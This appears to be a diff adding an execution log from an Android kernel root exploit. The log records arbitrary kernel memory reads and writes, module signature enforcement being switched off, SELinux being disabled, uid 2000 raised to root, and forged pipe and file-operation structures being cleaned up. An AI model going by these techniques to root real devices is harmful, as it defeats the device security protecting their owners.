+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0msig_enforce ffffff9162c09d20 1->0 write=1
+[b59eeb053 06:43:07] [33m[*][t18909] [0moplus_root_check: kptr_restrict write=-13 kaddr=0000000000000000 paddr=0000000000000000 (deferred: .text via ocsk.ko)
+[b59eeb053 06:43:07] [31m[-][t18909] [0moplus_root_check: no address (harvest/kallsyms), skip
+[b59eeb053 06:43:07] [33m[*][t18909] [0mroot ocs detector patch ok=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mroot self exiting (PI safe; control -> kernelsu driver) done=1
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffffdfbcdd1d38 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffffdfbcdd1d38 len=8 fill=0 pos=7883678008957363548 page=92978c7e8d66b7dc hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff9385ec9000 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mpselect paranoid after=-1 mlock=516
+[b59eeb053 06:43:07] [33m[*][t18909] [0mpselect route done calls=1 success=1 step=0 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=217 target=ffffffdfbcdd1d38 len=8 fill=0 pos=7883678008957363548 page=92978c7e8d66b7dc hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mwaiter waiting for pi_cleanup before exit
+[b59eeb053 06:43:07] [33m[*][t18909] [0mwaiter pi_cleanup done; exiting
+[b59eeb053 06:43:07] [33m[*][t13382] [0mroute threads joined (waiter exited cleanly)
+[b59eeb053 06:43:07] [32m[+][t13382] [0mpipe-physrw-summary pid=13382 done=1 root=1 kaslr=1 base=ffffffdfba280000 slide=0000001faa200000
+[b59eeb053 06:43:07] [32m[+][t13382] [0mpipe physrw pid=13382 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0 sid=2014/2014->1492739/1492739 selinux=1->0 setgid=0 setuid=0 setenforce=0/0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef538010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd1ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef538810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd22b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef539010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd2ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef539810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd32b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53a010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd3ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53a810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd42b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53b010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd4ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53b810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd52b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53c010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd5ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53c810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd62b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53d010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd6ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53d810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd72b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53e010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd7ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53e810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd82b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53f010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd8ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs read fd=217 target=ffffff93ef53f810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd92b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mpipe cleared forged ops count=0 base=ffffff93ef538000
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs write fd=217 target=ffffff9385ec9001 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mcfgfs write fd=217 target=ffffff9385ec9079 len=24 set=0 wr=24 errno=0
+[b59eeb053 06:43:07] [33m[*][t13382] [0mks_neutralize fake fops close slots owner=8 tail=24 table=ffffff9385ec9001 ok=1 verified=1
+[b59eeb053 06:43:07] [33m[*][t13382] [0mmisc.fops guard expect ffffffdfbcdd1e08 -> 0000000000000000
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: closed fake-fops probe fd=217 (after pipe clear, before child kill)
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: killing pipe_prepare_child=19081
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: pipe_prepare_child reaped
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: constructor returning
+CHAIN_EXIT_DONE
